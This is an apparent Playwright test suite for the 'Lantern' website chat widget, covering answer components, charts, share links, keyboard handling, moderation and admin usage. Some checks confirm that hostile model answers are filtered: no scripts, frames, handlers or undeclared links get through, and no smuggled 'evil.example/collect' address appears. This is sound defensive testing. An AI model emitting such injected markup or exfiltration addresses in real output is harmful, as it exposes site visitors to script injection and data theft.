  const parts = [...last.children].filter((el) => !el.classList.contains('az-chat-share')).map((el) => {
    if (el.tagName === 'P') return { kind: 'p', text: el.textContent };
    if (!el.classList.contains('az-chat-part')) return { kind: `unexpected ${el.tagName}` };
    if (el.querySelector('.az-pricing')) return { kind: 'quote', prices: [...el.querySelectorAll('[data-monthly]')].map((p) => p.textContent) };
    if (el.querySelector('.az-faq-item')) return { kind: 'faq', items: [...el.querySelectorAll('.az-faq-item')].map((i) => [i.querySelector('.az-faq-toggle')?.textContent, i.querySelector('.az-faq-answer p')?.textContent]) };
    if (el.querySelector('.az-feature-item')) {
      return { kind: 'feature', items: [...el.querySelectorAll('.az-feature-item')].map((i) => [i.querySelector('.az-feature-item-title')?.textContent ?? '', i.querySelector('.az-feature-item-text')?.textContent ?? '']) };
    }
    const a = el.querySelector('a.az-action');
    if (a) return { kind: 'cta', label: a.textContent, href: a.getAttribute('href') };
    return { kind: 'unknown part' };
  });
  return { busy: last.getAttribute('aria-busy'), parts };
});

/** What a case's events must look like on the page: its prose as paragraphs, then each component (every corpus answer puts its prose first). */
function expectedParts(expect) {
  const out = paragraphsOf(expect.text).map((text) => ({ kind: 'p', text }));
  for (const b of expect.blocks) {
    if (b.quote) out.push({ kind: 'quote' });
    else if (b.faq) out.push({ kind: 'faq', items: b.faq.map((i) => [i.q, i.a]) });
    else if (b.cta) out.push({ kind: 'cta', label: b.cta.label, href: b.cta.to });
    else if (b.feature) out.push({ kind: 'feature', items: b.feature.map((i) => [i.title, i.text]) });
  }
  return out;
}

/** The DOM of every answer: nothing that loads, runs or styles itself, and every link one of the file's own destinations. */
const answerHazards = (page, allowed) => page.evaluate((allowed) => {
  const root = document.querySelector('[data-az-chat-transcript]');
  const bad = [];
  for (const el of root.querySelectorAll('img, script, iframe, object, embed, style, link, meta, form, video, audio, source, picture, base')) bad.push(el.tagName);
  for (const el of root.querySelectorAll('*')) {
    for (const a of el.attributes) if (/^on/i.test(a.name) || a.name === 'style' || a.name === 'srcset' || a.name === 'src') bad.push(`${el.tagName}[${a.name}]`);
  }
  for (const a of root.querySelectorAll('[href]')) if (!allowed.includes(a.getAttribute('href'))) bad.push(`href ${a.getAttribute('href')}`);
  return bad;
}, allowed);

async function componentsFlow(b, name, origins) {
  const ctx = await watchedContext(b, csp, CONTEXT);
  try {
    const page = await ctx.newPage();
    recordRequests(page, origins);
    page.on('dialog', (d) => { check(`${name}: no dialog ever opens`, false, d.message()); void d.dismiss(); });
    await page.goto(`${host.url}/ask`);
    await ready(page);

    // U1/U3: prose, the site's own pricing table, a composed FAQ, a call to action, a list.
    const legal = CORPUS.find((c) => c.name === 'legal');
    const legalAt = await answerCount(page);
    const said = await announcements(page, () => ask(page, legal.ask));
    const shown = await lastAnswer(page);
    const kinds = shown.parts.map((p) => p.kind);
    check(`${name}: an answer shows prose, then the quoted pricing, a composed FAQ, a call to action and a list, in order`,
      JSON.stringify(kinds) === JSON.stringify(['p', 'quote', 'faq', 'cta', 'feature']) && shown.busy === 'false', JSON.stringify(shown.parts));
    check(`${name}: the quoted pricing is the author's — their prices, never the model's`,
      JSON.stringify(shown.parts[1]?.prices) === JSON.stringify(['$9.00', '$29.00']), JSON.stringify(shown.parts[1]));
    check(`${name}: the components hold the answer's text exactly`,
      JSON.stringify(shown.parts.slice(2)) === JSON.stringify(expectedParts(legal.expect).slice(2)), JSON.stringify(shown.parts.slice(2)));
    check(`${name}: the status region names each component once`,
      ['Pricing table, 2 plans.', '1 question and answer.', 'Link: Talk to us.', 'A list of 2 items.'].every((s) => said.join(' ').includes(s)), JSON.stringify(said));
    // This answer, by its place: later answers come after it.
    const answer = page.locator('[data-az-chat-transcript] > .az-chat-message--site').nth(legalAt);
    // The quoted billing switch works: the behaviour runtime wired the copy.
    await answer.getByLabel('Annual').check();
    const annual = await answer.locator('[data-monthly]').allTextContents();
    check(`${name}: the quoted pricing's billing switch works in the answer`, JSON.stringify(annual) === JSON.stringify(['$90.00', '$290.00']), JSON.stringify(annual));
    // The composed FAQ opens.
    const toggle = answer.locator('.az-faq-toggle').first();
    const closed = await toggle.getAttribute('aria-expanded');
    await toggle.click();
    check(`${name}: the composed FAQ starts closed and opens`, closed === 'false' && await toggle.getAttribute('aria-expanded') === 'true'
      && await answer.locator('.az-faq-answer').first().isVisible());
    await axe(page, `${name} answered with components`);
    // §9: an answer holding components is a stop in the Tab order, named as one; prose alone is not.
    check(`${name}: an answer with components is a keyboard stop named Answer; the greeting is not`,
      await answer.getAttribute('tabindex') === '0' && await answer.getAttribute('aria-label') === 'Answer'
      && await page.locator('[data-az-chat-transcript] > .az-chat-message--site').first().getAttribute('tabindex') === null);

    // The corpus: each hostile answer becomes exactly its expected parts — nothing else is drawn.
    for (const c of CORPUS.filter((x) => x.name !== 'legal')) {
      await ask(page, c.ask);
      const got = await lastAnswer(page);
      const want = expectedParts(c.expect).map((p) => (p.kind === 'quote' ? { kind: 'quote' } : p));
      const seen = got.parts.map((p) => (p.kind === 'quote' ? { kind: 'quote' } : p));
      const same = JSON.stringify(seen) === JSON.stringify(want);
      check(`${name}: corpus ${c.name} — rendered exactly as filtered (${c.expect.blocks.length} component(s), ${c.expect.dropped.length} refused)`,
        same, same ? '' : `${JSON.stringify(seen).slice(0, 400)} ≠ ${JSON.stringify(want).slice(0, 400)}`);
    }
    const hazards = await answerHazards(page, RULES.destinations);
    check(`${name}: across every answer, no image, script, frame, style or handler — and every link one the .az file declares`, hazards.length === 0, hazards.join(', '));
    await axe(page, `${name} after the corpus`);

    // The call to action goes where it says: a declared route of the site.
    await answer.getByRole('link', { name: 'Talk to us' }).click();
    await page.waitForURL((u) => u.pathname === '/contact', { timeout: STATE_MS });
    check(`${name}: the answer's call to action opens the site's own /contact`, new URL(page.url()).pathname === '/contact');
  } finally {
    closed = (await closeWithin(ctx, CLOSE_MS, `${name} components context close`)) && closed;
  }
}

/* ---- C2b: charts, tables, stats, cards, dashboards; share links (§20.9) ---- */

/** The last answer's rich parts as a visitor's browser has them. */
const richAnswer = (page) => page.evaluate(() => {
  const items = document.querySelectorAll('[data-az-chat-transcript] > .az-chat-message--site');
  const last = items[items.length - 1];
  const figure = (f) => ({
    title: f.querySelector('[data-az-chat-slot="title"]')?.textContent ?? '',
    ai: Boolean(f.querySelector('[data-az-chat-ai]')),
    source: Boolean(f.querySelector('[data-az-chat-source]')),
    svg: f.querySelector('svg[role="img"]') ? { marks: f.querySelectorAll('svg[role="img"] rect, svg[role="img"] path').length, labelled: Boolean(f.querySelector('svg[role="img"]')?.getAttribute('aria-labelledby')) } : null,
    summary: f.querySelector('[data-az-chat-slot="summary"]')?.textContent ?? null,
    equivalent: f.querySelectorAll('details table tbody tr').length,
    legend: [...f.querySelectorAll('.az-chat-legend-item')].map((li) => li.textContent),
  });
  return {
    text: [...last.querySelectorAll(':scope > p')].map((p) => p.textContent),
    figures: [...last.querySelectorAll('figure.az-chat-figure')].map(figure),
    dashboard: last.querySelector('.az-chat-dashboard') ? {
      title: last.querySelector('.az-chat-dashboard-title')?.textContent,
      tiles: last.querySelectorAll('.az-chat-tile').length,
    } : null,
    stats: [...last.querySelectorAll('.az-chat-stat')].map((s) => [...s.querySelectorAll('dt, dd')].map((x) => x.textContent?.trim())),
    cards: [...last.querySelectorAll('.az-chat-card')].map((c) => ({
      title: c.querySelector('h3')?.textContent, text: c.querySelector('p')?.textContent ?? null,
      img: c.querySelector('img')?.getAttribute('src') ?? null, alt: c.querySelector('img')?.getAttribute('alt') ?? null,
      href: c.querySelector('a')?.getAttribute('href') ?? null,
    })),
    styled: last.querySelectorAll('[style]').length,
    share: Boolean(last.querySelector('.az-chat-share')),
  };
});

async function richFlow(b, name, origins) {
  const ctx = await watchedContext(b, csp, CONTEXT);
  try {
    const page = await ctx.newPage();
    recordRequests(page, origins);
    page.on('dialog', (d) => { check(`${name}: no dialog ever opens`, false, d.message()); void d.dismiss(); });
    await page.goto(`${host.url}/figures`);
    await ready(page);
    await axe(page, `${name} figures idle`);

    // A dashboard: the server's figures and the model's, side by side, each labelled for what it is.
    const said = await announcements(page, () => ask(page, 'figures-dashboard'));
    const dash = await richAnswer(page);
    check(`${name}: a dashboard of a stat, a server chart and a model chart`, dash.dashboard?.title === 'This month' && dash.dashboard.tiles === 3, JSON.stringify(dash.dashboard));
    const server = dash.figures.find((f) => f.title === 'Orders by status');
    const model = dash.figures.find((f) => f.title === 'Expected next quarter');
    check(`${name}: the AI label is on the model's chart and not on the server's`, model?.ai === true && model.source === false && server?.ai === false && server.source === true,
      JSON.stringify({ server, model }));
    check(`${name}: the server chart counts the table — 3 statuses, bars drawn — with a summary and a table equivalent`,
      server?.svg?.labelled === true && /Bar chart, Orders by status: 3 bars; from 1 \(\w+\) to 3 \(paid\)/.test(server.summary ?? '') && server.equivalent === 3, JSON.stringify(server));
    check(`${name}: the server's stat is October's orders and their change`, JSON.stringify(dash.stats[0]?.slice(0, 2)) === JSON.stringify(['Orders', '4'])
      && /up 3 vs 2026-09/.test(dash.stats[0]?.[2] ?? ''), JSON.stringify(dash.stats));
    check(`${name}: nothing in a drawn answer carries a style attribute`, dash.styled === 0, `${dash.styled}`);
    check(`${name}: the status region names the dashboard once, with its AI figures`, said.some((s) => s.includes('Dashboard: This month, 3 tiles, some AI-generated figures')), JSON.stringify(said));
    await axe(page, `${name} dashboard`);

    // Every other component: a pie of the site's revenue, a sortable model table, a model stat, an image card.
    await ask(page, 'figures-mix');
    const mix = await richAnswer(page);
    const pie = mix.figures.find((f) => f.title === 'Revenue by status');
    check(`${name}: a pie of the site's figures, its legend naming each slice and its share`,
      pie?.ai === false && pie.legend.length === 3 && pie.legend.every((l) => /— \d+(\.\d)?%$/.test(l)), JSON.stringify(pie));
    const plans = mix.figures.find((f) => f.title === 'Plans');
    check(`${name}: the model's table carries the AI label`, plans?.ai === true, JSON.stringify(plans));
    const answers = page.locator('[data-az-chat-transcript] > .az-chat-message--site');
    const last = answers.last();
    const sort = last.locator('.az-chat-table button', { hasText: 'Seats' });
    await sort.click();
    const sorted = await last.locator('figure', { hasText: 'Plans' }).locator('tbody tr td:first-child').allTextContents();
    const ariaSort = await last.locator('th', { hasText: 'Seats' }).getAttribute('aria-sort');
    check(`${name}: a sortable table sorts by a header button, and says so`, JSON.stringify(sorted) === JSON.stringify(['Solo', 'Team', 'Business']) && ariaSort === 'ascending', `${JSON.stringify(sorted)} ${ariaSort}`);
    check(`${name}: a model stat carries the AI label; its change is a glyph and words`,
      JSON.stringify(mix.stats[0]) === JSON.stringify(['Conversion', '3.2%', '▲ up 0.4%', 'AI-generated figures']), JSON.stringify(mix.stats));
    check(`${name}: the image card shows the gallery's own image by key, with the author's alt, and links to the declared /contact`,
      mix.cards.length === 1 && /^\/.+\.webp$/.test(mix.cards[0].img ?? '') && mix.cards[0].alt === 'An empty workbench under a single lamp' && mix.cards[0].href === '/contact',
      JSON.stringify(mix.cards));
    await axe(page, `${name} every component`);

    // The rich corpus: a forged source, NaN, a private field, an image address, a private column.
    await ask(page, 'figures-attack');
    const attack = await richAnswer(page);
    check(`${name}: forged figures, NaN and a private field show nothing; the card keeps its text and loses the address`,
      attack.figures.length === 0 && attack.cards.length === 1 && attack.cards[0].img === null && attack.cards[0].text === 'No image here.',
      JSON.stringify(attack));
    const html = await page.content();
    check(`${name}: no private value and no smuggled address reaches the page`, !html.includes('private-mark') && !html.includes('evil.example/collect'));

    // Share the dashboard answer: the link, opened signed out, shows the same answer read-only.
    const dashAnswer = answers.nth(1);
    check(`${name}: a finished answer offers Share`, dash.share);
    await dashAnswer.getByRole('button', { name: 'Share this answer' }).click();
    await dashAnswer.getByRole('button', { name: 'Create link' }).click();
    const url = dashAnswer.locator('[data-az-chat-slot="url"]');
    await url.waitFor({ state: 'visible', timeout: STATE_MS });
    const link = await url.inputValue();
    const deleteLink = await dashAnswer.locator('[data-az-chat-slot="delete"]').inputValue();
    check(`${name}: Create link gives a link to the shared page and a delete link`,
      new RegExp(`^${host.url}/chat/shared#[A-Za-z0-9_-]{22}$`).test(link) && deleteLink.startsWith(`${link}&`), `${link} ${deleteLink}`);
    await axe(page, `${name} share made`);
    const outside = await watchedContext(b, csp, CONTEXT);
    try {
      const view = await outside.newPage();
      recordRequests(view, origins);
      await view.goto(link);
      await view.waitForFunction(() => document.querySelector('[data-az-chat-transcript]')?.getAttribute('aria-busy') === null && document.querySelector('.az-chat-dashboard'), null, { timeout: STATE_MS });
      const shared = await richAnswer(view);
      const sharedModel = shared.figures.find((f) => f.title === 'Expected next quarter');
      const sharedServer = shared.figures.find((f) => f.title === 'Orders by status');
      check(`${name}: signed out, the shared link shows the same dashboard, the AI label on the model's chart only`,
        shared.dashboard?.tiles === 3 && sharedModel?.ai === true && sharedServer?.ai === false && JSON.stringify(shared.text) === JSON.stringify(dash.text),
        JSON.stringify(shared.dashboard));
      check(`${name}: the shared page is read-only and noindex`,
        await view.locator('textarea, [data-az-chat-form], [data-az-chat-transcript] .az-chat-share').count() === 0
        && await view.locator('meta[name="robots"][content="noindex, nofollow"]').count() === 1,
        `${await view.locator('textarea, [data-az-chat-form], [data-az-chat-transcript] .az-chat-share').count()} ${await view.locator('meta[name="robots"]').count()}`);
      await axe(view, `${name} shared page`);
      // The delete link deletes; the link is then gone.
      await view.goto(deleteLink);
      await view.reload();
      const del = view.locator('[data-az-chat-delete]');
      await del.waitFor({ state: 'visible', timeout: STATE_MS });
      await del.click();
      await view.waitForFunction(() => document.querySelector('[data-az-chat-note]')?.textContent === 'This shared answer is deleted.', null, { timeout: STATE_MS });
      await view.goto(link);
      await view.reload();
      await view.locator('[data-az-chat-error]').waitFor({ state: 'visible', timeout: STATE_MS });
      check(`${name}: after its delete link is used, the link says it has expired or was deleted`,
        (await view.locator('[data-az-chat-error]').textContent()) === 'This link has expired or was deleted.');
    } finally {
      closed = (await closeWithin(outside, CLOSE_MS, `${name} shared context close`)) && closed;
    }

    // Expiry: a second share, its time run out in the server's own database, is gone the same way.
    await answers.nth(2).getByRole('button', { name: 'Share this answer' }).click();
    await answers.nth(2).getByRole('button', { name: 'Create link' }).click();
    const second = answers.nth(2).locator('[data-az-chat-slot="url"]');
    await second.waitFor({ state: 'visible', timeout: STATE_MS });
    const expiring = await second.inputValue();
    const id = expiring.split('#')[1];
    const db = new DatabaseSync(join(serverDir, 'data/test.db'));
    try { db.prepare('UPDATE az_chat_shares SET expires = ? WHERE id = ?').run(Date.now() - 1, id); } finally { db.close(); }
    const later = await watchedContext(b, csp, CONTEXT);
    try {
      const view = await later.newPage();
      recordRequests(view, origins);
      await view.goto(expiring);
      await view.locator('[data-az-chat-error]').waitFor({ state: 'visible', timeout: STATE_MS });
      check(`${name}: an expired share link is gone`, (await view.locator('[data-az-chat-error]').textContent()) === 'This link has expired or was deleted.');
    } finally {
      closed = (await closeWithin(later, CLOSE_MS, `${name} expired context close`)) && closed;
    }
  } finally {
    closed = (await closeWithin(ctx, CLOSE_MS, `${name} figures context close`)) && closed;
  }
}

/* ---- C3: the float, §9's polish, answers from a table it knows ---- */

const launcher = (page) => page.locator('[data-az-chat-launcher]');
const floatDialog = (page) => page.locator('dialog.az-chat-dialog');
const isFocused = (locator) => locator.evaluate((el) => el === document.activeElement);
/** The float's state as the page has it: open, modal, the launcher's aria-expanded, where focus is, the page's scroll lock. */
const floatState = (page) => page.evaluate(() => {
  const d = document.querySelector('dialog.az-chat-dialog');
  const a = document.activeElement;
  return {
    open: d?.open === true, modal: d?.matches(':modal') === true,
    expanded: document.querySelector('[data-az-chat-launcher]')?.getAttribute('aria-expanded'),
    input: a?.hasAttribute('data-az-chat-input') === true, launcher: a?.hasAttribute('data-az-chat-launcher') === true,
    inside: Boolean(d && a && d.contains(a)), locked: document.documentElement.hasAttribute('data-az-scroll-lock'),
  };
});
/** The float's dialog has finished moving in: axe and a screenshot see it as a visitor does, not mid-fade. */
const settled = (page) => page.waitForFunction(() => {
  const d = document.querySelector('dialog.az-chat-dialog');
  return d?.getAttribute('data-state') === 'open' && d.getAnimations({ subtree: true }).every((a) => a.playState !== 'running');
}, null, { timeout: STATE_MS });
/** Press Tab until `locator` has focus, at most `max` times. */
async function tabTo(page, locator, max = 60) {
  for (let i = 0; i < max; i++) {
    if (await isFocused(locator)) return true;
    await page.keyboard.press('Tab');
  }
  return isFocused(locator);
}
/** The transcript is scrolled to its end (overlay chat-logic.ts atEnd, the same slack). */
const transcriptAtEnd = (page) => page.evaluate(() => {
  const t = document.querySelector('[data-az-chat-transcript]');
  return t.scrollHeight - t.scrollTop - t.clientHeight <= 24;
});
/** Scroll the long answer up while it streams: the transcript must stop following and offer Jump to latest. */
async function scrolledUpWhileStreaming(page) {
  const input = panel(page).locator('[data-az-chat-input]');
  await input.fill('scroll please');
  await input.press('Enter');
  await page.waitForFunction(() => {
    const t = document.querySelector('[data-az-chat-transcript]');
    return t.scrollHeight > t.clientHeight + 200;
  }, null, { timeout: STATE_MS });
  await page.evaluate(() => { document.querySelector('[data-az-chat-transcript]').scrollTop = 0; });
  await panel(page).locator('[data-az-chat-latest]').waitFor({ state: 'visible', timeout: STATE_MS });
  const before = await page.evaluate(() => document.querySelectorAll('[data-az-chat-transcript] > li:last-child > p').length);
  await page.waitForFunction((n) => document.querySelectorAll('[data-az-chat-transcript] > li:last-child > p').length >= n + 3, before, { timeout: STATE_MS });
  const stayed = await page.evaluate(() => document.querySelector('[data-az-chat-transcript]').scrollTop <= 24);
  await page.waitForFunction(() => document.querySelector('[data-az-chat-transcript] > li:last-child')?.getAttribute('aria-busy') === 'false', null, { timeout: STATE_MS });
  return stayed;
}

async function floatFlow(b, name, origins) {
  const wide = await watchedContext(b, csp, { ...CONTEXT, viewport: { width: 1280, height: 800 } });
  try {
    const page = await wide.newPage();
    recordRequests(page, origins);
    page.on('dialog', (d) => { check(`${name}: no browser dialog ever opens`, false, d.message()); void d.dismiss(); });

    // §3.1: the site's float is on every page without a chat of its own, asking from that page.
    const seen = [];
    for (const route of ['/pricing', '/contact', '/terms', '/login']) {
      await page.goto(`${host.url}${route}`);
      await ready(page);
      const named = await page.getByRole('button', { name: 'Ask Lantern' }).isVisible();
      const asks = JSON.parse(await panel(page).getAttribute('data-az-chat')).page;
      seen.push(`${route}:${named && asks === route}`);
    }
    check(`${name}: the site's float is on every page without a chat of its own, named by its title, asking from that page`,
      seen.every((x) => x.endsWith(':true')), seen.join(' '));
    await page.goto(`${host.url}/signup`);
    await page.waitForFunction(() => document.documentElement.hasAttribute('data-az-ready'), null, { timeout: STATE_MS });
    check(`${name}: chat none leaves it out of /signup`, await page.locator('[data-az-chat]').count() === 0);
    await page.goto(`${host.url}/`);
    await ready(page, 'signin');
    check(`${name}: a page's own panel replaces the float there — one chat`,
      await page.locator('[data-az-chat]').count() === 1 && await launcher(page).count() === 0 && await page.locator('.az-chat--panel').count() === 1);

    // Wide: by keyboard, a side panel that does not hold focus; Escape closes; focus returns to the launcher.
    await page.goto(`${host.url}/pricing`);
    await ready(page);
    await axe(page, `${name} float closed`);
    const reached = await tabTo(page, launcher(page));
    // WebKit's default keyboard setting leaves buttons out of Tab (the browser's choice, not the page's): there the
    // launcher must be a real button in the Tab order, and it is focused directly.
    const inOrder = await launcher(page).evaluate((el) => el.tagName === 'BUTTON' && el.tabIndex === 0);
    check(`${name}: ${name === 'webkit' ? 'the launcher is a button in the Tab order (WebKit\'s default Tab skips buttons)' : 'Tab reaches the launcher'}`,
      name === 'webkit' ? inOrder : reached);
    if (!reached) await launcher(page).focus();
    await page.keyboard.press('Enter');
    await floatDialog(page).waitFor({ state: 'visible', timeout: STATE_MS });
    const opened = await floatState(page);
    check(`${name}: wide, the launcher opens a side panel — not modal, aria-expanded, focus in the input`,
      opened.open && !opened.modal && opened.expanded === 'true' && opened.input && !opened.locked, JSON.stringify(opened));
    check(`${name}: CONTROL: with motion allowed the panel moves as it fades`,
      /transform/.test(await floatDialog(page).evaluate((d) => getComputedStyle(d).transitionProperty)));
    // Backwards: the launcher comes before the panel, so Shift+Tab reaches the page (forwards, past the panel, is the browser's own UI).
    let left = false;
    for (let i = 0; i < 40 && !left; i++) {
      await page.keyboard.press('Shift+Tab');
      left = !(await floatState(page)).inside;
    }
    check(`${name}: wide, Shift+Tab may leave the side panel for the page (it holds nothing)`, left);
    await panel(page).locator('[data-az-chat-input]').focus();
    await settled(page);
    await axe(page, `${name} float open`);
    await page.keyboard.press('Escape');
    const shut = await floatState(page);
    check(`${name}: Escape closes the panel and focus returns to the launcher`, !shut.open && shut.launcher && shut.expanded === 'false', JSON.stringify(shut));

    // §8.2: the answer the model gives only when the guides row reached it — and the private column did not.
    await launcher(page).click();
    await floatDialog(page).waitFor({ state: 'visible', timeout: STATE_MS });
    const before = await answerCount(page);
    const said = await announcements(page, async () => {
      const input = panel(page).locator('[data-az-chat-input]');
      await input.fill('What is the warranty?');
      await input.press('Enter');
      const grounded = await nextAnswer(page, before);
      check(`${name}: an answer from the knows table — given the guides row, never its private column`,
        JSON.stringify(grounded.paragraphs) === JSON.stringify(['Every lamp has a lifetime warranty on its frame.']), JSON.stringify(grounded.paragraphs));
    });
    check(`${name}: in the float, the status region hears the finished sentence`, said.length > 0 && said.every((x) => /[.!?]$/.test(x)), JSON.stringify(said));
    await settled(page);
    await axe(page, `${name} float answered`);

    // §9: Escape stops an answer first; only the next Escape closes.
    const input = panel(page).locator('[data-az-chat-input]');
    await input.fill('stall please');
    await input.press('Enter');
    await panel(page).locator('[data-az-chat-stop]').waitFor({ state: 'visible', timeout: STATE_MS });
    await page.keyboard.press('Escape');
    await page.waitForFunction(() => document.querySelector('[data-az-chat-note]')?.textContent === 'Stopped.', null, { timeout: STATE_MS });
    check(`${name}: Escape stops the answer and leaves the panel open`, (await floatState(page)).open);
    await page.keyboard.press('Escape');
    const after = await floatState(page);
    check(`${name}: the next Escape closes it, focus back on the launcher`, !after.open && after.launcher, JSON.stringify(after));

    // §9: scrolled up, the transcript stops following and offers Jump to latest; that goes back to the end.
    await launcher(page).click();
    await floatDialog(page).waitFor({ state: 'visible', timeout: STATE_MS });
    const stayed = await scrolledUpWhileStreaming(page);
    check(`${name}: scrolled up while an answer streams, the transcript stays where the visitor put it`, stayed);
    const jump = panel(page).locator('[data-az-chat-latest]');
    check(`${name}: Jump to latest is offered, a real button`, await jump.isVisible() && (await jump.textContent()).trim() === 'Jump to latest');
    await settled(page);
    await axe(page, `${name} float scrolled up`);
    await jump.click();
    await page.waitForFunction(() => {
      const t = document.querySelector('[data-az-chat-transcript]');
      return t.scrollHeight - t.scrollTop - t.clientHeight <= 24;
    }, null, { timeout: STATE_MS });
    check(`${name}: Jump to latest goes to the newest words, hides itself and leaves focus in the input`,
      await transcriptAtEnd(page) && !(await jump.isVisible()) && await isFocused(panel(page).locator('[data-az-chat-input]')));
  } finally {
    closed = (await closeWithin(wide, CLOSE_MS, `${name} float context close`)) && closed;
  }

  // Below sm: the overlay engine's sheet — modal, the page locked, Tab and Shift+Tab held inside.
  const narrow = await watchedContext(b, csp, { ...CONTEXT, viewport: { width: 390, height: 844 } });
  try {
    const page = await narrow.newPage();
    recordRequests(page, origins);
    await page.goto(`${host.url}/contact`);
    await ready(page);
    await launcher(page).focus();
    await page.keyboard.press('Enter');
    await floatDialog(page).waitFor({ state: 'visible', timeout: STATE_MS });
    const sheet = await floatState(page);
    check(`${name}: narrow, the launcher opens a modal sheet, the page locked, focus in the input`,
      sheet.open && sheet.modal && sheet.locked && sheet.input, JSON.stringify(sheet));
    let held = true;
    for (let i = 0; i < 25 && held; i++) { await page.keyboard.press('Tab'); held = (await floatState(page)).inside; }
    for (let i = 0; i < 25 && held; i++) { await page.keyboard.press('Shift+Tab'); held = (await floatState(page)).inside; }
    check(`${name}: in the sheet, Tab and Shift+Tab never leave it`, held);
    await settled(page);
    await axe(page, `${name} float sheet`);
    await page.keyboard.press('Escape');
    const back = await floatState(page);
    check(`${name}: Escape closes the sheet, unlocks the page and returns focus to the launcher`, !back.open && !back.locked && back.launcher, JSON.stringify(back));
  } finally {
    closed = (await closeWithin(narrow, CLOSE_MS, `${name} sheet context close`)) && closed;
  }

  // Reduced motion: the panel only fades (no slide), and Jump to latest jumps rather than glides.
  const still = await watchedContext(b, csp, { ...CONTEXT, viewport: { width: 1280, height: 800 }, reducedMotion: 'reduce' });
  try {
    const page = await still.newPage();
    recordRequests(page, origins);
    await page.goto(`${host.url}/terms`);
    await ready(page);
    await launcher(page).click();
    await floatDialog(page).waitFor({ state: 'visible', timeout: STATE_MS });
    check(`${name}: reduced motion, the panel only fades — no slide`,
      (await floatDialog(page).evaluate((d) => getComputedStyle(d).transitionProperty)) === 'opacity');
    await scrolledUpWhileStreaming(page);
    const instant = await page.evaluate(() => {
      document.querySelector('[data-az-chat-latest]').click();
      const t = document.querySelector('[data-az-chat-transcript]');
      return t.scrollHeight - t.scrollTop - t.clientHeight <= 24;
    });
    check(`${name}: reduced motion, Jump to latest is at the end at once — no smooth scroll`, instant);
  } finally {
    closed = (await closeWithin(still, CLOSE_MS, `${name} reduced-motion context close`)) && closed;
  }
}

/* ---- C3: snapshots of the answered states, every theme, both schemes (§12, gate item 3's method) ---- */

const SNAP_OUT = join(ROOT, '.visual-out/chat');
const SNAP_STATES = [
  { name: 'float-wide', viewport: { width: 1280, height: 800 }, route: '/pricing', ask: 'What is the warranty?', float: true, whole: false },
  { name: 'float-sheet', viewport: { width: 390, height: 844 }, route: '/pricing', ask: 'What is the warranty?', float: true, whole: true },
  { name: 'components', viewport: { width: 1280, height: 2200 }, route: '/ask', ask: CORPUS.find((c) => c.name === 'legal').ask, float: false, whole: false },
  { name: 'dashboard', viewport: { width: 1280, height: 2200 }, route: '/figures', ask: 'figures-dashboard', float: false, whole: false },
];

/* ---- C4: the moderation hook and the operator's usage view ------------ */

/** A question the hook blocks (§6.8): fixed copy, no answer, the model never asked — and the chat goes on. */
async function moderationFlow(b, name, origins) {
  const ctx = await watchedContext(b, csp, CONTEXT);
  try {
    const page = await ctx.newPage();
    recordRequests(page, origins);
    await page.goto(`${host.url}/ask`);
    await ready(page);
    const before = await answerCount(page);
    const input = panel(page).locator('[data-az-chat-input]');
    await input.fill(`Please ${MODERATE_BLOCK} ${VISITOR_MARK}`);
    await input.press('Enter');
    const error = panel(page).locator('[data-az-chat-error]');
    await page.waitForFunction(() => (document.querySelector('[data-az-chat-error]')?.textContent ?? '') !== '', null, { timeout: STATE_MS });
    check(`${name}: a question the moderation hook blocks is refused in fixed copy, with no answer drawn`,
      (await error.textContent()) === 'This question can’t be answered here — try asking it another way.' && (await answerCount(page)) === before
      && !(await panel(page).locator('[data-az-chat-retry]').isVisible()),
      `${await error.textContent()} · answers ${await answerCount(page)} (was ${before})`);
    await axe(page, `${name} blocked by moderation`);
    // The question after it is the visitor's own: allowed, it is answered.
    const answer = await ask(page, 'How bright is it?');
    check(`${name}: after a block the next question is judged afresh and answered`, answer.paragraphs.join('') === 'It is bright: 800 lumens. Dimmable too.', JSON.stringify(answer.paragraphs));
  } finally {
    closed = (await closeWithin(ctx, CLOSE_MS, `${name} moderation context close`)) && closed;
  }
}

/** The usage view (§11.4): /admin to a verified, listed account — today's counts, never a message; others refused by the server. */
async function adminFlow(b, name, origins) {
  const ctx = await watchedContext(b, csp, CONTEXT);
  try {
    const page = await ctx.newPage();
    recordRequests(page, origins);
    // Another signed-in account first: the server refuses it the usage, whatever the page would show.
    await signUp(page, `Visitor${name}`);
    const refused = await page.evaluate(async (base) => (await fetch(`${base}/admin/chat`, { credentials: 'include' })).status, proxy.url);
    check(`${name}: a signed-in account not listed as an admin is refused the chat usage (403)`, refused === 403, String(refused));
    await page.evaluate(async (base) => { await fetch(`${base}/auth/sign-out`, { method: 'POST', credentials: 'include', headers: { 'x-az-request': '1' } }); }, proxy.url);
    // The admin: signed up with a listed address, which the site's operator has verified.
    await signUp(page, `Admin${name}`, adminEmail(name));
    {
      const db = new DatabaseSync(join(serverDir, 'data/test.db'));
      try { db.prepare('UPDATE az_users SET email_verified = 1 WHERE email = ?').run(adminEmail(name)); } finally { db.close(); }
    }
    await page.goto(`${host.url}/admin`);
    await page.locator('#az-admin-chat-days').waitFor({ state: 'visible', timeout: STATE_MS });
    const view = await page.evaluate(() => {
      const section = document.querySelector('[aria-labelledby="az-admin-chat"]');
      const rows = [...section.querySelectorAll('tbody tr')].map((tr) => [...tr.children].map((c) => c.textContent));
      return { text: section.textContent, rows, heads: [...section.querySelectorAll('thead th')].map((th) => th.textContent) };
    });
    const today = new Date().toISOString().slice(0, 10);
    const todayRow = view.rows.find((r) => r[0] === today);
    check(`${name}: /admin shows the chat's usage to its admin — today's messages and tokens, the budget left`,
      Boolean(todayRow) && Number(todayRow[1].replace(/\D/g, '')) > 0 && /tokens spent, [\d,.\s  ]+ left\./.test(view.text)
      && JSON.stringify(view.heads) === JSON.stringify(['Day', 'Messages', 'Input tokens', 'Output tokens', 'Dropped components', 'Shares made']),
      JSON.stringify(view).slice(0, 300));
    const whole = await page.evaluate(() => document.body.textContent ?? '');
    check(`${name}: the usage view holds no visitor's or model's words`, !whole.includes(VISITOR_MARK) && !whole.includes(ANSWER_MARK) && !whole.includes(MODERATE_BLOCK) && !whole.includes('lumens'));
    await axe(page, `${name} admin chat usage`);
  } finally {
    closed = (await closeWithin(ctx, CLOSE_MS, `${name} admin context close`)) && closed;
  }
}

/** One answered state as a PNG, from a fresh page: nothing moving, fonts loaded, the caret hidden. */
async function snapshot(b, url, scheme, state) {
  const ctx = await watchedContext(b, csp, { ...CONTEXT, viewport: state.viewport, colorScheme: scheme, reducedMotion: 'reduce' });
  try {
    const page = await ctx.newPage();
    await page.goto(`${url}${state.route}`);
    await ready(page);
    if (state.float) {
